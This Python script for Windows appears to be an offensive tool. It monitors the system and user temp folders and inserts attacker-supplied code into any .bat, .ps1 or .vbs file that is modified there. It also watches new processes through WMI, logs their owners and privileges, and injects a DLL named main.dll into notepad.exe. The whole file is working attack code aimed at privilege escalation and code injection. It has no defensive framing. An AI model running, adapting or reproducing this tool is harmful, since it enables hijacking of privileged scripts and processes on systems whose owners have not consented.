import win32api
import win32con
import win32file
import win32security
import pythoncom
import threading
import wmi
import os
import sys
import tempfile

vitinject_installed = True

try:
    import vitinject
except ImportError:
    vitinject_installed = False


def inject_code(full_filename, contents, extension):
    if FILE_TYPES[extension][0].strip() in contents:
        return

    full_contents = FILE_TYPES[extension][0]
    full_contents += FILE_TYPES[extension][1]
    full_contents += contents

    with open(full_filename, 'w') as f:
        f.write(full_contents)

    print('\\o/ Injected code')


def get_process_privileges(pid):
    try:
        hproc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, pid)
        htok = win32security.OpenProcessToken(hproc, win32con.TOKEN_QUERY)
        privs = win32security.GetTokenInformation(htok, win32security.TokenPrivileges)

        privileges = ''

        for priv_id, flags in privs:
            if flags == win32security.SE_PRIVILEGE_ENABLED | win32security.SE_PRIVILEGE_ENABLED_BY_DEFAULT:
                privileges += f'{("|" if privileges else "")}{win32security.LookupPrivilegeName(None, priv_id)}'
    except:
        privileges = 'N/A'

    return privileges


def file_monitor(path_to_watch):
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,
                None,
                None
            )

            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)

                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')

                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')

                elif action == FILE_MODIFIED:
                    extension = os.path.splitext(full_filename)[1]

                    if extension in FILE_TYPES:
                        print(f'[*] Modified {full_filename}')
                        print(f'[vvv] Injecting code...')

                        try:
                            with open(full_filename) as f:
                                contents = f.read()

                            inject_code(full_filename, contents, extension)

                            print(contents)

                            print('[^^^] Injection completed.')
                        except Exception as e:
                            print(f'[!!! Injection failed. {e}')

                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')

                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')

                else:
                    print(f'[?] Unknown action on {full_filename}')
        except:
            pass


def process_monitor():
    pythoncom.CoInitialize()

    c = wmi.WMI()

    process_watcher = c.Win32_Process.watch_for('creation')

    while True:
        try:
            new_process = process_watcher()
            cmdline = new_process.CommandLine
            creation_date = new_process.CreationDate
            executable = new_process.ExecutablePath
            parent_pid = new_process.ParentProcessId
            pid = new_process.ProcessId
            owner = new_process.GetOwner()

            privileges = get_process_privileges(pid)

            if os.path.split(executable)[1] in PROCESSES_NAMES:
                process_log_message = (
                    '[+] New process\n\n'
                    f'Command: {cmdline}\n'
                    f'Created: {creation_date}\n'
                    f'Executable: {executable}\n'
                    f'Parent PID: {parent_pid}\n'
                    f'PID: {pid}\n'
                    f'Owner: {owner}\n'
                    f'Privileges: {privileges}\n'
                )

                print(process_log_message)

                print(f'[vvv] Injecting DLL...')

                vitinject.inject(pid, DLL_PATH)

                print('[^^^] Injection completed.\n')
        except:
            pass


FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

FILE_LIST_DIRECTORY = 0x0001

PATHS = ['C:\\Windows\\Temp', tempfile.gettempdir()]

FILE_TYPES = {
    '.bat': ['REM VitNet\r\n', '{}\r\n'],
    '.ps1': ['#VitNet\r\n', '{}\r\n'],
    '.vbs': ['\'VitNet\r\n', '{}\r\n']
}

PROCESSES_NAMES = ['notepad.exe']

DLL_PATH = 'main.dll'

for filetype in FILE_TYPES:
    filename = f'code{filetype}'

    if os.path.isfile(filename):
        with open(filename, 'r') as f:
            FILE_TYPES[filetype][1] = FILE_TYPES[filetype][1].format(f.read())

for path in PATHS:
    file_monitor_thread = threading.Thread(target=file_monitor, args=(path,))
    file_monitor_thread.start()

if vitinject_installed and PROCESSES_NAMES and os.path.isfile(DLL_PATH):
    process_monitor_thread = threading.Thread(target=process_monitor)
    process_monitor_thread.start()
